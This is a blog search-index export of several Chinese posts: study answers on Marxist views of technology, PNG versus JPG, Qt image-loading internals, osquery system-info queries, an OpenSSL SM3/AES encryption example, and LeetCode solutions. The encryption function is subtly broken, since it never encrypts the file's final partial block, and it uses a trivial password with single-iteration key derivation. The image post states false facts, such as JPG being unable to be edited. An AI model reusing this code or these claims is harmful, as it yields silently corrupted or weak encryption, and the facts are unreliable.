为什么说新时代中国马克思主义科学技术是一个科学、完整的思想理论体系？ &nbsp;&nbsp;毛泽东、邓小平、……、胡锦涛、习近平的科学技术思想，是在中国共产党领导我国科学技术事业发展和进行社会主义现代化建设的伟大时间中，逐渐形成、发展和完善的。 &nbsp;&nbsp;中国马克思主义科学技术观是基于马克思、恩格斯的科学技术思想，对当代科学技术机器发展规律的概括和总结，是马克思主义科学技术论的重要组成部分。 &nbsp;&nbsp;中国马克思主义科学技术观是中国共产党人集体智慧的结晶，是对毛泽东、邓小平、……、习近平科学技术思想的概括和总结，是他们科学技术思想的理论升华和飞跃，是他们科学技术思想的凝练和精髓。 &nbsp;&nbsp;中国马克思主义科学技术观的内容丰富，涉及了科学技术的功能、目标、机制、战略、人才和方针等重大问题，是一个科学、完整的思想理论体系。 2. 如何理解中国马克思主义科学技术观的理论精髓？ &nbsp;&nbsp;中国马克思主义科学技术观概括和总结了毛泽东、邓小平、···、习近平等的科学技术思想，包括科学技术的功能观、战略观、人才观、和谐观和创新观的基木内容，体现出时代性、实践性、科学性、创新性、自主性、人本性等特征，建设中国特色的创新型国家，是中国马克思主义科学技术观的具体体现。中国马克思主义科学技术观，是马克思主义科学技术观与中国具体科学技术实践相结合的产物，是马克思主义科学技术论的重要组成部分。 3. 如何理解习近平新时代中国特色社会主义思想中的科学技术观的时代意义？ &nbsp;&nbsp;中国马克思主义科学技术观的三个历史阶段是其各自所处的历史条件所决定的，是对时代背景实事求是的反映，因此科学技术思想都镌刻了时代的烙印，反映了时代的需求。 &nbsp;&nbsp;习近平新时代中国特色社会主义思想中的科学技术观，是在中国特色社会主义进入新时代的历史条件下形成的。新时代之“新”，一是在于我们进入了一个新的发展阶段，发展环境、发展条件都发生了新的变化，目标任务也发生了新的变化;二是在于我们面临着新的社会主义主要矛盾;三是我们迈向新的奋斗目标。正是基于这一新时代的”新”特征时代背景，习近平立足于我贵哦科学技术与社会发展的现实需要，提出了一系列关于科学技术发展的理论观点，形成了习近平新时代中国特色社会主义科学技术观。 参考链接： 2019自然辩证法课后思考题及答案_文档之家","tags":[],"categories":[{"name":"Z_杂记","slug":"Z-杂记","permalink":"http://example.com/categories/Z-%E6%9D%82%E8%AE%B0/"}]},{"title":"png和jpg格式的图片(一)","date":"2023-10-27T01:24:02.558Z","path":"Z_杂记/png和jpg格式图片/","text":"[toc] jpg 和 png 图片格式在写这篇文章之前，笔者在编写一个简单的 Qt 程序时遇到了这样一个问题： 问题：一个png格式的图片改成后缀为jpg格式的图片时，QLabel无法读取的问题。笔者是通过setStyleSheet()、QImage、QPixmap的接口均尝试过将改后缀后图片设置到QLabel中，均以失败告终。 特此研究了一下这jpg和png两者之间的区别，后续再研究一下Qt关于相关格式图片读取的问题。 图片会有jpg和png两种格式，那么这俩种格式的图片又有着什么样的区别呢？下面就给大家分享一下。 png和jpg都是常用的图片格式，其中png属于无损压缩，jpg是有损压缩，使用中两者最明显的一个区别是: png支持透明通道 jpg的图片更适合在网络中传播和使用。 jpg格式 jpg：是JPEG标准的产物，也是目前网络最为流行的图片格式，jpg格式的图片可以将图像文件压缩到最小格式，在高度压缩率的同时，可以展现是分丰富生动的图像，但是随着压缩比的增大，图片的品质会逐渐降低的。我们现在常用的jpg的标准全程为JPEG 2000标准，有以下几点特性： 高压缩率 无损压缩和有损压缩 渐进传输 感兴趣区域压缩 码流的随机访问和处理 容错性 基于内容的描述 png格式 png：是一种采用无损压缩算法的位图模式，其设计目的是视图替代GIF和TIFF文件格式，同时增加一下GIF文件格式所不具备的特性。PNG使用从LZ77派生的无损数据压缩算法，一般应用于JAVA程序、网页或S60程序中，原因就是因为png的压缩比更高，生成文件体积小。png图片也有一些特性： 体积小 无损压缩 索引彩色模式 更优化的网络传输显示 支持透明模式 关于 png 格式还需要说明的是： png格式有8位、24位、32位三种形式，其中8位PNG支持两种不同的透明形式（索引透明和alpha透明），24位PNG不支持透明，32位PNG在24位基础上增加了8位透明通道，因此可展现256级透明程度。 PNG8和PNG24后面的数字则是代表这种PNG格式最多可以索引和存储的颜色值。8代表2的8次方也就是256色，而24则代表2的24次方大概有1600多万色。 区别：png 和 jpg 转自百度百科： 1、JPEG可以对照片（或类似）图像生成更小的文件，这是由于JPEG采用了一种针对照片图像的特定有损编码方法，这种编码适用于低对比，图像颜色过渡平滑，噪声多，且结构不规则的情况下。如果在这种情况下用PNG代替JPEG，文件尺寸增大很多，而图像质量的提高有限。相应的，如果保存文本，线条或类似的边缘清晰，有大块相同颜色区域的图像，PNG格式的压缩效果就要比JPEG好很多，并且不会出现JPEG那样的高对比度区域的图像有损。如果图像既有清晰边缘，又有照片图像的特点，就在在这两种格式之间权衡一下了。JPEG不支持透明度。 2、由于JPEG是有损压缩，会产生迭代有损，在重复压缩和解码的过程中会不断丢失信息使图像质量下降。由于PNG是无损的，保存将要被编辑的图像来说更加合适。虽然PNG压缩照片图像也有效，但有专门针对照片图像设计的无损压缩格式，比如无损JPEG2000，Adobe DNG等。总的来说这些格式都不能做到适用所有图像。对于将要发布的图像可以保存成JPEG，用JPEG编码一次不会造成明显的图像有损。 总结就是： jpg格式的图片能在高度压缩率的同时，展现十分丰富生动的图像，但是随着压缩比的增大，图片的品质会逐渐降低的。而png图片的特性就是体积小，节约空间，与jpg图片相比，png图片时无损压缩，在不损失图片数据的情况下，可以快速的获取自己想要的图片，而且图片的质量并不会下降。 png格式的图片可以编辑，比如图片中的字体、线条等，可以通过ps等软件更改。但是jpg格式的图片则不可以更改，png与jpg图片相比png格式的图片更大。","tags":[{"name":"图片","slug":"图片","permalink":"http://example.com/tags/%E5%9B%BE%E7%89%87/"},{"name":"格式","slug":"格式","permalink":"http://example.com/tags/%E6%A0%BC%E5%BC%8F/"}],"categories":[{"name":"Z_杂记","slug":"Z-杂记","permalink":"http://example.com/categories/Z-%E6%9D%82%E8%AE%B0/"}]},{"title":"png和jpg格式的图片(二)","date":"2023-10-27T01:24:02.557Z","path":"Z_杂记/Qt-images/","text":"[TOC] 背景在上篇文章 png和jpg格式图片 中笔者就 jpg 和 png 两种格式进行了说明，但是关于 Qt 打开改后缀文件名之后图片的问题依然没有说明。要探究Qt为何不能打开改了后缀的图片文件，这个还是得从多方面去定位。前文说了，通过三种方式设置了 QLabel 的图片。 场景复现 这里还是先说明一下设置不成功的场景如何复现: 找一张 .jpg 的图片，修改后缀也就是文件属性为 .png 通过以下三种方式中的任意一种去设置 QLabel 为图片。 Qt 版本是 5.9 编译器试了 MSVC 和 mingw 都不好使。 QLabel 设置图片方法 通过 QPixmap设置 QLabel 的图片 1234QPixmap img(&quot;:/Win11.png&quot;);ui-&gt;label-&gt;setPixmap(img);ui-&gt;label-&gt;setScaledContents(true); 通过 QImage 设置 QLabel 的图片 123QImage img;img.load(&quot;:/Win11.png&quot;);ui-&gt;label-&gt;setPixmap(QPixmap::fromImage(img)) 通过 QLabel.setStyleSheet() 的图片 123ui-&gt;label-&gt;setStyleSheet(QString(&quot;QLabel&#123;&quot; &quot;border-image:url(:/Win11.png) 4 4 4 4 stretch stretch;&quot; &quot;&#125;&quot;)); 当然还有第四种方法，通过 QSvgRenderer 设置： 1234567#include &lt;QSvgRenderer&gt;QSvgRenderer svgRender(QString(&quot;:/Win11.svg&quot;));QPixmap pixmap(20,20);QPainter painter(&amp;pixmap);svgRender.render(&amp;painter);ui-&gt;label-&gt;setPixmap(pixmap); 场景是描述完了，可以动手尝试了 操作接着就是去查看几种实现方式中的源码是如何是设置的了，这里先猜一下结论 就是 png 和 jpg 格式的算法不同，格式问题导致的读取的算法不一致，因此Qt内部实现的读取图片的算法只能根据图片文件的后缀所对应的算法去读取算法，而 setStyleSheet 算法也是基于这么一个逻辑，因此三种读取方式都不成功。 关于图片算法的问题，在上篇文章 png和jpg格式图片 中也略微提到，这个我们不深做研究，只需知道 jpg 和 png 不是同一种算法，也不通用即可。 初步验证因为上述几种步骤笔者都做过尝试，因此在验证过程中我们不纠结于使用哪一种方式，直接看结果。 那如何去验证呢，我们还是看代码，这次我们在 Qt 的 qrc 文件中，去掉图片的后缀名，不带后缀属性去读取图片看看其是否可以读取成功。 运行结果: QLabel 读取成功 如上图所示，在 qrc 文件中去掉图片的后缀，读取图片设置到 QLabel 依然是成功的。 我们接着操作，在代码中修改图片后缀为 png，看看这次能不能读取成功。 运行结果：读取失败 如上图所示，添加后缀后反而还展示不成功了。 初步验证的结果这就基本上说明了： 在 Qt 的内部有很大的几率是通过文件的后缀去判断调用哪个图片读取算法的。也就是说，当你人为的修改了 png-&gt;jpg 时，在 Qt 中就会出现设置图片失败的问题。目前看来，在代码没有问题，但是图片设置后不显示的情况下，最好的方式是，就是去掉图片的后缀，让 Qt 自己去判断调用哪个算法读取图片。 源码分析这里有关于 Qt 图片 I\\O 的描述可以看看Qt帮助手册中关于图像文件读写的文档。 源码部分，我们只需查看两个Qt 类就行，个人感觉看一个就知道了。两者识别图片的算法应该是一致的。包括 setStyleSheet()接口中设置图片的接口应该都是一致的。 QPixmap依赖于所在的平台的绘图引擎，故例如反锯齿等一些效果在不同的平台上可能会有不同的显示效果，QImage使用Qt自身的绘图引擎，可在不同平台上具有相同的显示效果 目前的Qt会把QPixmap都存储在graphics memory中，QImage是存储在客户端的，是独立于硬件的。在X11, Mac 以及 Symbian平台上，QPixmap 是存储在服务器端，而QImage则是存储在客户端，在Windows平台上，QPixmap和QImage都是存储在客户端，并不使用任何的GDI资源。 由于QImage是独立于硬件的，也是一种QPaintDevice，因此我们可以在另一个线程中对其进行绘制，而不需要在GUI线程中处理，使用这一方式可以很大幅度提高UI响应速度。 QPixmap查询到QPixmap的源文件，一般存放在 Qt 安装目录下 $&#123;安装目录&#125;\\5.9.9\\Src\\qtbase\\src\\gui\\image，文件名为 qpixmap.h qpixmap.cpp 先看一下 QPixmap 的 构造函数中读取图片文件的方法。 QPixmap::QPixmap(const QString&amp; fileName, const char *format, Qt::ImageConversionFlags flags)的源码 123456789QPixmap::QPixmap(const QString&amp; fileName, const char *format, Qt::ImageConversionFlags flags) : QPaintDevice() &#123; doInit(0, 0, QPlatformPixmap::PixmapType); if (!qt_pixmap_thread_test()) return; load(fileName, format, flags); // 这里看到调用了load()的接口，接着查看load是如何实现的 &#125; load()函数源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879/*! Loads a pixmap from the file with the given \\a fileName. Returns true if the pixmap was successfully loaded; otherwise invalidates the pixmap and returns \\c false. The loader attempts to read the pixmap using the specified \\a format. If the \\a format is not specified (which is the default), the loader probes the file for a header to guess the file format. The file name can either refer to an actual file on disk or to one of the application&#x27;s embedded resources. See the \\l&#123;resources.html&#125;&#123;Resource System&#125; overview for details on how to embed pixmaps and other resource files in the application&#x27;s executable. If the data needs to be modified to fit in a lower-resolution result (e.g. converting from 32-bit to 8-bit), use the \\a flags to control the conversion. Note that QPixmaps are automatically added to the QPixmapCache when loaded from a file; the key used is internal and can not be acquired. \\sa loadFromData(), &#123;QPixmap#Reading and Writing Image Files&#125;&#123;Reading and Writing Image Files&#125;*//* 翻译过来就是从给定的文件名的文件中加载一个像素图。如果pixmap成功加载，则为True;否则返回无效pixmap并返回\\c false。加载器尝试使用指定的\\a读取pixmap格式。如果没有指定\\a格式(这是默认的)，加载器探测文件的头，以猜测文件的格式。文件名可以指向磁盘上的实际文件，也可以指向磁盘上的实际文件应用程序的嵌入式资源。看到\\l&#123;resources.html&#125;&#123;Resource System&#125;概述如何嵌入pixmap和其他资源文件在应用程序的可执行文件。如果数据需要修改以适应低分辨率结果(例如从32位转换到8位)，使用\\a标志来控制转换。注意，qpixmap会自动添加到QPixmapCache中当从文件加载时;使用的密钥是内部的，不能被收购。\\sa loadFromData()， &#123;QPixmap#读写图像读写图像文件&#125;*/// loadFromdata的源码我也补充到了文末bool QPixmap::load(const QString &amp;fileName, const char *format, Qt::ImageConversionFlags flags)&#123; if (!fileName.isEmpty()) &#123; QFileInfo info(fileName); // Note: If no extension is provided, we try to match the // file against known plugin extensions if (info.completeSuffix().isEmpty() || info.exists()) &#123; QString key = QLatin1String(&quot;qt_pixmap&quot;) % info.absoluteFilePath() % HexString&lt;uint&gt;(info.lastModified().toSecsSinceEpoch()) % HexString&lt;quint64&gt;(info.size()) % HexString&lt;uint&gt;(data ? data-&gt;pixelType() : QPlatformPixmap::PixmapType); if (QPixmapCache::find(key, this)) return true; data = QPlatformPixmap::create(0, 0, data ? data-&gt;pixelType() : QPlatformPixmap::PixmapType); if (data-&gt;fromFile(fileName, format, flags)) &#123; QPixmapCache::insert(key, *this); return true; &#125; &#125; &#125; if (!isNull()) &#123; if (isQBitmap()) *this = QBitmap(); else data.reset(); &#125; return false;&#125; 一看源码是不是就清晰多了。在 load()函数的实现中：①判断文件名是不是为空；②不为空时，首先就是读取文件的后缀。这里我们可以细细查一下第二个 if 判断中 QString 类型的 key 到底是进行了一个什么操作。 12345QString key = QLatin1String(&quot;qt_pixmap&quot;) % info.absoluteFilePath() // 返回文件名的绝对路径 % HexString&lt;uint&gt;(info.lastModified().toSecsSinceEpoch()) // 返回文件最后一次修改的日期和时间 % HexString&lt;quint64&gt;(info.size()) // 返回文件的大小 % HexString&lt;uint&gt;(data ? data-&gt;pixelType() : QPlatformPixmap::PixmapType); // 这里的data是成员变量，就是说如果设置了data的pixelType的值就读取，没设置的话就是默认值 QPlatformPixmap::PixmapType 上述的 HexString&lt;type&gt;就是 ASCII 的数组形式，16进制 的数组。上述代码中的 % 操作如果不是求余的话会是什么呢。如果是求余，QString 会报错才是呀？？？ 这里最终还是通过设置和查看 QPixmap 的内置变量 data 中的标志去查看当前文件是不是图片，如果是图片，则会修改当前的 QPixmap 指针，如果不是就会返回 false。 12if (QPixmapCache::find(key, this)) return true; 这里补充一个QPixmapCache的demo： 1234567/*在缓存中查找与给定键关联的缓存pixmap。如果找到了pixmap，函数将pixmap设置为该pixmap并返回true;否则，它将保留pixmap并返回false。*/QPixmap pm;if (!QPixmapCache::find(&quot;my_big_image&quot;, &amp;pm)) &#123; pm.load(&quot;bigimage.png&quot;); QPixmapCache::insert(&quot;my_big_image&quot;, pm);&#125;painter-&gt;drawPixmap(0, 0, pm); 最终判断当前文件是不是图片应该是在 data-&gt;fromFile() 中实现的。 这个data的定义： 1QExplicitlySharedDataPointer&lt;QPlatformPixmap&gt; data; 未完成这篇文章还在编辑中 补充 补充一下 load()的函数有必要读一下。 QPixmap::loadFromData() 的源码。 12345678910111213141516171819202122232425262728293031323334/*! \\fn bool QPixmap::loadFromData(const uchar *data, uint len, const char *format, Qt::ImageConversionFlags flags) Loads a pixmap from the \\a len first bytes of the given binary \\a data. Returns \\c true if the pixmap was loaded successfully; otherwise invalidates the pixmap and returns \\c false. The loader attempts to read the pixmap using the specified \\a format. If the \\a format is not specified (which is the default), the loader probes the file for a header to guess the file format. If the data needs to be modified to fit in a lower-resolution result (e.g. converting from 32-bit to 8-bit), use the \\a flags to control the conversion. \\sa load(), &#123;QPixmap#Reading and Writing Image Files&#125;&#123;Reading and Writing Image Files&#125;*/bool QPixmap::loadFromData(const uchar *buf, uint len, const char *format, Qt::ImageConversionFlags flags)&#123; if (len == 0 || buf == 0) &#123; data.reset(); return false; &#125; data = QPlatformPixmap::create(0, 0, QPlatformPixmap::PixmapType); if (data-&gt;fromData(buf, len, format, flags)) return true; data.reset(); return false;&#125;","tags":[{"name":"图片","slug":"图片","permalink":"http://example.com/tags/%E5%9B%BE%E7%89%87/"},{"name":"格式","slug":"格式","permalink":"http://example.com/tags/%E6%A0%BC%E5%BC%8F/"},{"name":"Qt","slug":"Qt","permalink":"http://example.com/tags/Qt/"}],"categories":[{"name":"Z_杂记","slug":"Z-杂记","permalink":"http://example.com/categories/Z-%E6%9D%82%E8%AE%B0/"}]},{"title":"使用 osquery 查询系统uuid和系统信息","date":"2023-10-27T01:24:02.555Z","path":"G_工具/osquery/查询uuid和系统信息/","text":"查询uuid方法一 见查询信息方法二 通过注册表12345SELECT data from registry where key =&#x27;HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Cryptography&#x27; AND name=&#x27;MachineGuid&#x27;;# 或者SELECT data FROM registry WHERE path=&#x27;HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Cryptography\\\\MachineGuid&#x27; 查询系统版本号和windows版本方法一 直接查询1SELECT uuid, computer_name, hardware_model, hardware_serial FROM system_info; 方法二 通过注册表123456789101112SELECT data FROM registry WHERE key = &#x27;HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion&#x27; AND name IN(&#x27;CurrentMajorVersionNumber&#x27;,&#x27;CurrentMinorVersionNumber&#x27;, &#x27;CurrentBuildNumber&#x27;, &#x27;ProductName&#x27;)ORDER BY CASE name WHEN &#x27;ProductName&#x27; THEN 1 WHEN &#x27;CurrentMajorVersionNumber&#x27; THEN 2 WHEN &#x27;CurrentMinorVersionNumber&#x27; THEN 3 WHEN &#x27;CurrentBuildNumber&#x27; THEN 4 ELSE 3 END;","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"osquery","slug":"osquery","permalink":"http://example.com/tags/osquery/"}],"categories":[{"name":"G_工具","slug":"G-工具","permalink":"http://example.com/categories/G-%E5%B7%A5%E5%85%B7/"},{"name":"osquery","slug":"G-工具/osquery","permalink":"http://example.com/categories/G-%E5%B7%A5%E5%85%B7/osquery/"}]},{"title":"自动生成 readme 文档","date":"2023-10-27T01:24:02.508Z","path":"G_工具/ReadneGenerator/","text":"开源地址： https://github.com/kefranabg/readme-md-generator 自动生成 readme 的开源工具 安装方式：npm i -g readme-md-generator npm版本要大于8","tags":[{"name":"工具","slug":"工具","permalink":"http://example.com/tags/%E5%B7%A5%E5%85%B7/"},{"name":"readme","slug":"readme","permalink":"http://example.com/tags/readme/"}],"categories":[{"name":"G_工具","slug":"G-工具","permalink":"http://example.com/categories/G-%E5%B7%A5%E5%85%B7/"}]},{"title":"使用SM3加密文件","date":"2023-10-27T01:24:02.507Z","path":"G_工具/OpenSSL/使用sm3加密文件/","text":"以下是使用 OpenSSL 库进行 SM3 消息摘要和文件加密的 C++ 示例代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;string&gt;#include &lt;openssl/evp.h&gt;#include &lt;openssl/sha.h&gt;#include &lt;openssl/sm3.h&gt;// 计算字符串的 SM3 摘要值std::string sm3_hash_string(const std::string&amp; str) &#123; unsigned char md[SM3_DIGEST_LENGTH]; SM3(reinterpret_cast&lt;const unsigned char*&gt;(str.data()), str.size(), md); std::string hash_str(reinterpret_cast&lt;const char*&gt;(md), SM3_DIGEST_LENGTH); return hash_str;&#125;// 计算文件的 SM3 摘要值std::string sm3_hash_file(const std::string&amp; file_path) &#123; unsigned char md[SM3_DIGEST_LENGTH]; std::ifstream input(file_path, std::ios::binary); if (input) &#123; EVP_MD_CTX* mdctx = EVP_MD_CTX_new(); EVP_DigestInit_ex(mdctx, EVP_sm3(), nullptr); const size_t buf_size = 4096; char buf[buf_size]; while (input.read(buf, buf_size)) &#123; EVP_DigestUpdate(mdctx, buf, buf_size); &#125; size_t remain_size = input.gcount(); EVP_DigestUpdate(mdctx, buf, remain_size); EVP_DigestFinal_ex(mdctx, md, nullptr); EVP_MD_CTX_free(mdctx); input.close(); std::string hash_str(reinterpret_cast&lt;const char*&gt;(md), SM3_DIGEST_LENGTH); return hash_str; &#125; else &#123; throw std::runtime_error(&quot;fail to open file &quot; + file_path); &#125;&#125;// 使用密码对文件进行加密void encrypt_file(const std::string&amp; input_file_path, const std::string&amp; output_file_path, const std::string&amp; password) &#123; std::ifstream input(input_file_path, std::ios::binary); std::ofstream output(output_file_path, std::ios::binary); if (input &amp;&amp; output) &#123; const int key_len = EVP_MAX_KEY_LENGTH; const int iv_len = EVP_MAX_IV_LENGTH; unsigned char key[key_len]; unsigned char iv[iv_len]; EVP_BytesToKey(EVP_aes_256_cbc(), EVP_sm3(), nullptr, reinterpret_cast&lt;const unsigned char*&gt;(password.data()), password.size(), 1, key, iv); EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new(); EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, key, iv); const size_t buf_size = 4096; char buf[buf_size]; while (input.read(buf, buf_size)) &#123; int len = input.gcount(); int out_len = 0; EVP_EncryptUpdate(ctx, reinterpret_cast&lt;unsigned char*&gt;(buf), &amp;out_len, reinterpret_cast&lt;unsigned char*&gt;(buf), len); output.write(buf, out_len); &#125; int len = input.gcount(); int out_len = 0; EVP_EncryptFinal_ex(ctx, reinterpret_cast&lt;unsigned char*&gt;(buf), &amp;out_len); output.write(buf, out_len); EVP_CIPHER_CTX_free(ctx); input.close(); output.close(); &#125; else &#123; throw std::runtime_error(&quot;fail to open input/output file.&quot;); &#125;&#125;int main() &#123; std::string str = &quot;message to be hashed&quot;; std::cout &lt;&lt; &quot;SM3 hash of string \\&quot;&quot; &lt;&lt; str &lt;&lt; &quot;\\&quot;: &quot; &lt;&lt; sm3_hash_string(str) &lt;&lt; std::endl; std::string file_path = &quot;test.txt&quot;; std::cout &lt;&lt; &quot;SM3 hash of file \\&quot;&quot; &lt;&lt; file_path &lt;&lt; &quot;\\&quot;: &quot; &lt;&lt; sm3_hash_file(file_path) &lt;&lt; std::endl; std::string password = &quot;123456&quot;; try &#123; encrypt_file(file_path, &quot;test_encrypted.txt&quot;, password); &#125; catch (const std::exception&amp; e) &#123; std::cout &lt;&lt; &quot;Error: &quot; &lt;&lt; e.what() &lt;&lt; std::endl; &#125; return 0;&#125; 上述代码中，使用 SM3 函数对字符串或文件内容进行摘要；使用 EVP_BytesToKey 函数生成密码加密密钥和初始化向量，并使用 EVP_EncryptInit_ex 函数初始化加密上下文，在循环中调用 EVP_EncryptUpdate 函数对文件进行逐块加密，最后调用 EVP_EncryptFinal_ex 函数完成加密过程，将结果写入新的加密文件中。","tags":[{"name":"加密","slug":"加密","permalink":"http://example.com/tags/%E5%8A%A0%E5%AF%86/"},{"name":"SM3","slug":"SM3","permalink":"http://example.com/tags/SM3/"},{"name":"OpenSSL","slug":"OpenSSL","permalink":"http://example.com/tags/OpenSSL/"}],"categories":[{"name":"G_工具","slug":"G-工具","permalink":"http://example.com/categories/G-%E5%B7%A5%E5%85%B7/"},{"name":"OpenSSL","slug":"G-工具/OpenSSL","permalink":"http://example.com/categories/G-%E5%B7%A5%E5%85%B7/OpenSSL/"}]},{"title":"常见排序算法整理（C++)","date":"2023-10-27T01:24:02.504Z","path":"G_LeetCode/排序算法/","text":"快速排序1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071/******************************************************************************Welcome to GDB Online.GDB online is an online compiler and debugger tool for C, C++, Python, Java, PHP, Ruby, Perl,C#, OCaml, VB, Swift, Pascal, Fortran, Haskell, Objective-C, Assembly, HTML, CSS, JS, SQLite, Prolog.Code, Compile, Run and Debug online from anywhere in world.*******************************************************************************/#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;// 左闭右闭区间int getRand(int min, int max) &#123; return ( rand() % (max - min + 1) ) + min ;&#125;void quickSort(vector&lt;int&gt;&amp; nums, int start, int end)&#123; if(start &gt; end) return; int i = start, j = end; int key = nums[start]; while(i &lt; j) &#123; while(i &lt; j &amp;&amp; nums[j] &lt; key) j--; while(i &lt; j &amp;&amp; nums[i] &gt;= key) i++; if(i&lt;j) &#123; swap(nums[i],nums[j]); &#125; &#125; swap(nums[i], nums[start]); quickSort(nums, start, i-1); quickSort(nums, i+1, end); &#125;void sort(vector&lt;int&gt; &amp; nums)&#123; if(nums.empty() || nums.size() &lt; 2) &#123; return; &#125; quickSort(nums, 0, nums.size() - 1);&#125;int main()&#123; vector&lt;int&gt; nums; for (int i = 0; i &lt; 20; i++) &#123; nums.push_back(std::move(getRand(0,100))); &#125; sort(nums); for (auto it : nums) cout &lt;&lt; it &lt;&lt; endl; return 0;&#125;","tags":[{"name":"排序","slug":"排序","permalink":"http://example.com/tags/%E6%8E%92%E5%BA%8F/"},{"name":"快速排序","slug":"快速排序","permalink":"http://example.com/tags/%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/"}],"categories":[{"name":"G_LeetCode","slug":"G-LeetCode","permalink":"http://example.com/categories/G-LeetCode/"}]},{"title":"2611. 老鼠和奶酪","date":"2023-10-27T01:24:02.503Z","path":"G_LeetCode/2611. 老鼠和奶酪/","text":"2023年6月7日23:18:51 [toc] 2611. 老鼠和奶酪 - 力扣（LeetCode）有两只老鼠和 n 块不同类型的奶酪，每块奶酪都只能被其中一只老鼠吃掉。 下标为 i 处的奶酪被吃掉的得分为： 如果第一只老鼠吃掉，则得分为 reward1[i] 。如果第二只老鼠吃掉，则得分为 reward2[i] 。给你一个正整数数组 reward1 ，一个正整数数组 reward2 ，和一个非负整数 k 。 请你返回第一只老鼠恰好吃掉 k 块奶酪的情况下，最大 得分为多少。 示例 1： 输入：reward1 &#x3D; [1,1,3,4], reward2 &#x3D; [4,4,1,1], k &#x3D; 2输出：15解释：这个例子中，第一只老鼠吃掉第 2 和 3 块奶酪（下标从 0 开始），第二只老鼠吃掉第 0 和 1 块奶酪。总得分为 4 + 4 + 3 + 4 &#x3D; 15 。15 是最高得分。示例 2： 输入：reward1 &#x3D; [1,1], reward2 &#x3D; [1,1], k &#x3D; 2输出：2解释：这个例子中，第一只老鼠吃掉第 0 和 1 块奶酪（下标从 0 开始），第二只老鼠不吃任何奶酪。总得分为 1 + 1 &#x3D; 2 。2 是最高得分。 提示： 1 &lt;&#x3D; n &#x3D;&#x3D; reward1.length &#x3D;&#x3D; reward2.length &lt;&#x3D; 1051 &lt;&#x3D; reward1[i], reward2[i] &lt;&#x3D; 10000 &lt;&#x3D; k &lt;&#x3D; n 来源：力扣（LeetCode）链接：https://leetcode.cn/problems/mice-and-cheese著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 Solution 思路贪心 + 排序 算出差值，取K 个最大值即可 代码 123456789101112131415161718192021class Solution &#123;public: int miceAndCheese(vector&lt;int&gt;&amp; reward1, vector&lt;int&gt;&amp; reward2, int k) &#123; int ans = 0; int n = reward1.size(); vector&lt;int&gt; diffs(n); for (int i = 0; i &lt; n; i++) &#123; ans += reward2[i]; diffs[i] = reward1[i] - reward2[i]; &#125; sort(diffs.begin(), diffs.end()); for (int i = 1; i &lt;=k; i++) &#123; ans += diffs[n-i]; &#125; return ans; &#125;&#125;; 123456789101112131415161718func miceAndCheese(reward1 []int, reward2 []int, k int) int &#123; ans := 0 n := len(reward1) diffs := make([]int, n) for i:=0; i&lt;n; i++ &#123; ans += reward2[i] diffs[i] = reward1[i] - reward2[i] &#125; sort.Ints(diffs) for i:=1; i&lt;=k; i++ &#123; ans += diffs[n-i] &#125; return ans&#125;","tags":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://example.com/tags/LeetCode/"},{"name":"贪心","slug":"贪心","permalink":"http://example.com/tags/%E8%B4%AA%E5%BF%83/"},{"name":"排序","slug":"排序","permalink":"http://example.com/tags/%E6%8E%92%E5%BA%8F/"}],"categories":[{"name":"G_LeetCode","slug":"G-LeetCode","permalink":"http://example.com/categories/G-LeetCode/"}]},{"title":"2352. 相等行列对 - 力扣（LeetCode）","date":"2023-10-27T01:24:02.501Z","path":"G_LeetCode/2352. 相等行列对/","text":"2023_06_06 [toc] 2352. 相等行列对 - 力扣（LeetCode）给你一个下标从 0 开始、大小为 n x n 的整数矩阵 grid ，返回满足 Ri 行和 Cj 列相等的行列对 (Ri, Cj) 的数目。 如果行和列以相同的顺序包含相同的元素（即相等的数组），则认为二者是相等的。 示例 1： 输入：grid &#x3D; [[3,2,1],[1,7,6],[2,7,7]]输出：1解释：存在一对相等行列对： (第 2 行，第 1 列)：[2,7,7] 示例 2： 输入：grid &#x3D; [[3,1,2,2],[1,4,4,5],[2,4,2,2],[2,4,2,2]]输出：3解释：存在三对相等行列对： (第 0 行，第 0 列)：[3,1,2,2] (第 2 行, 第 2 列)：[2,4,2,2] (第 3 行, 第 2 列)：[2,4,2,2] 提示： n &#x3D;&#x3D; grid.length &#x3D;&#x3D; grid[i].length1 &lt;&#x3D; n &lt;&#x3D; 2001 &lt;&#x3D; grid[i][j] &lt;&#x3D; 105 来源：力扣（LeetCode）链接：https://leetcode.cn/problems/equal-row-and-column-pairs著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 Solutioncpp123456789101112131415161718192021222324252627282930class Solution &#123;public: int equalPairs(vector&lt;vector&lt;int&gt;&gt;&amp; grid) &#123; int res = 0, n = grid.size(); for (int row = 0; row &lt; n; row++) &#123; for (int col = 0; col &lt; n; col++) &#123; if(equal(row, col, grid)) &#123; res++; &#125; &#125; &#125; return res; &#125; bool equal(int row, int col, vector&lt;vector&lt;int&gt;&gt; &amp;grid) &#123; int n = grid.size(); for (int i = 0; i &lt; n; i++) &#123; if(grid[row][i] != grid[i][col]) &#123; return false; &#125; &#125; return true; &#125;&#125;; Go1234567891011121314151617181920212223func equalPairs(grid [][]int) int &#123; n := len(grid) cnt := make(map[string]int) for _,row := range grid &#123; cnt[fmt.Sprint(row)]++ &#125; res := 0 for j := 0; j &lt; n; j++ &#123; var arr[] int for i := 0; i &lt; n; i++ &#123; arr = append(arr, grid[i][j]) &#125; if val,ok := cnt[fmt.Sprint(arr)]; ok &#123; res += val &#125; &#125; return 